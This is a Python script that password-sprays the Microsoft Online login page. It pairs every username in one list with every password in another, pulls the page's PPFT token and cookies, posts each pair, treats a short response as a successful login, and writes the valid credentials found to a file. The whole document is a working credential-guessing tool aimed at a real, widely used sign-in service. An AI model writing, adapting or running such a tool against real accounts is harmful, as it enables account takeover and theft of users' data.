import urllib, requests, htql, sys
from collections import OrderedDict
#
#  Usage:   script.py Userslist.txt Passwordslist.txt
#
#Pass in user and password lists as txt files
userList = [line.strip() for line in open(sys.argv[1], 'r')]
passwordList = [line.strip() for line in open(sys.argv[2], 'r')]

#Loop through each user vs all passwords, then go to the next user.
for password in passwordList:
    for user in userList:
        #Create session and grab initial cookies for microsoft online main login page
        targetURL = "https://login.microsoftonline.com"
        session = requests.Session()
        p = dict(pb1 = 'dd', pb2 = 'cc')
        response = session.get(targetURL, params = p, verify=True)
        targetCookies = response.cookies

        #Grab PPFT Token stored in HTML response
        page = repr(response.text)
        PPFT = ""
        query="<input>:name,value";
        for url, text in htql.HTQL(page, query):
            if (url == "PPFT"):
                PPFT = text;
        #Update headers for content-type, don't know why but is required
        session.headers.update({'Content-Type':'application/x-www-form-urlencoded'})

        #Create an ordered dictionary list, required because order matters when posting parameters back to server
        loginParams = OrderedDict([('login',user),('passwd',password),('PPFT',PPFT)])
        loginParams = urllib.urlencode(loginParams)

        #Post back to server
        attackRequest = session.post("https://login.microsoftonline.com/ppsecure/post.srf", data=loginParams, cookies=targetCookies, allow_redirects=True)

        #Check content length, usually 20k or so indicates failure, 2k or so indicates success. Need a better validation method.
        if(len(attackRequest.text) < 3000):
            print("SUCCESS! USERNAME: " + user + "\t PASSWORD: " + password)
            #Write valid credentials to output file
            with open("output.txt", "a") as outputFile:
                outputFile.write("SUCCESS:"+user+":"+password+"\n")
        else:
            print("LOGIN Attempt Failed " + user + "\t PASSWORD: " + password)
